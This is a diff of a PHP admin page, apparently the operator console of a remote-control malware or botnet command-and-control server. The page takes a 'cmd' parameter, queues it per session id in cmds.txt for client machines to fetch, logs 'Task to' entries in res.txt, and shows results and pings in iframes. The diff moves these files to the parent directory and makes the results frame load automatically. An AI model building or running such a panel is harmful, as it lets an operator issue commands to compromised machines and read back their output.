@@ -28,12 +28,12 @@ $cmd=$_REQUEST[ 'cmd' ];
 $cmd=urldecode($cmd);
 if (!empty($cmd)) {
 
-$file = 'cmds.txt';
+$file = '../cmds.txt';
 $current = file_get_contents($file);
 $current .= $sid.":".$cmd.PHP_EOL;
 file_put_contents($file, $current);
 
-$file = 'res.txt';
+$file = '../res.txt';
 $current = file_get_contents($file);
 $current .= "Task to ".$sid." => ".$cmd.PHP_EOL;
 file_put_contents($file, $current);
@@ -45,7 +45,7 @@ file_put_contents($file, $current);
 
 <?php
  function del_res(){
-file_put_contents('res.txt', '');
+file_put_contents('../res.txt', '');
 }
 
 
@@ -64,6 +64,7 @@ function reloadfrm() {
 }
 
 
+
 </script>
 <div class="bg">
 <div>
@@ -76,13 +77,13 @@ function reloadfrm() {
 <input type="submit" value="Envoyer" />
 </form>
 
-<button onclick="reloadfrm()">Refresh</button>
+<body onload="reloadfrm()"></body>
 <a href='admin.php?del=true'>Delete Logs</a>
 
 </div>
 
 <div>
-<iframe src='res.txt' height=400 width=400 id="iframeres" style="border:0;background-color: Black;"></iframe><iframe src='ping.txt' height=400 width=400 id="iframeping" style="border:0;background-color: Black;"></iframe>
+<iframe src='../res.txt' height=400 width=400 id="iframeres" style="border:0;background-color: Black;"></iframe><iframe src='../ping.txt' height=400 width=400 id="iframeping" style="border:0;background-color: Black;"></iframe>
 </div>
 </div>
 </body></html>
